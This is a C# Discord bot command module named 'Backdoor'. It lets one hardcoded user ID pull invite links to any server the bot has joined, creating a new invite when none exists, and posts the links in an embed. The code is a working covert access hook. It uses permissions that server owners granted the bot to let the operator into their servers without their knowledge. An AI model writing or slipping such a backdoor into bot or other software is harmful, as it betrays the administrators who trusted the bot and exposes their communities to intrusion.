using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Linq;

using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace DiscordBot.Core.Commands
{
	public class Backdoor : ModuleBase<SocketCommandContext>
	{
		[Command("backdoor"), Summary("Get the invite of server")]
		public async Task BackdoorModule(ulong GuildId)
		{
			if (!(Context.User.Id == 166031587035709441))
			{
				await Context.Channel.SendMessageAsync(":x: You're not my dad!");
				return;
			}

			if(Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
			{
				await Context.Channel.SendMessageAsync(":x: How did I get here?");
				return;
			}

			SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();

			var invites = await Guild.GetInvitesAsync();
			if(invites.Count < 1)
			{
				try
				{
					await Guild.TextChannels.First().CreateInviteAsync();
				}catch(Exception ex)
				{
					await Context.Channel.SendMessageAsync($":x: Creating invite for {Guild.Name} failed! ``{ex.Message}``");
					return;
				}
			}

			invites = null;
			invites = await Guild.GetInvitesAsync();
			EmbedBuilder embed = new EmbedBuilder();
			embed.WithAuthor($"Invites for {Guild.Name}:", Guild.IconUrl);
			embed.WithColor(40, 200, 150);
			foreach(var current in invites)
				embed.AddInlineField("Invite:", $"[Invite]({current.Url})");

			await Context.Channel.SendMessageAsync("", false, embed.Build());
		}
	}
}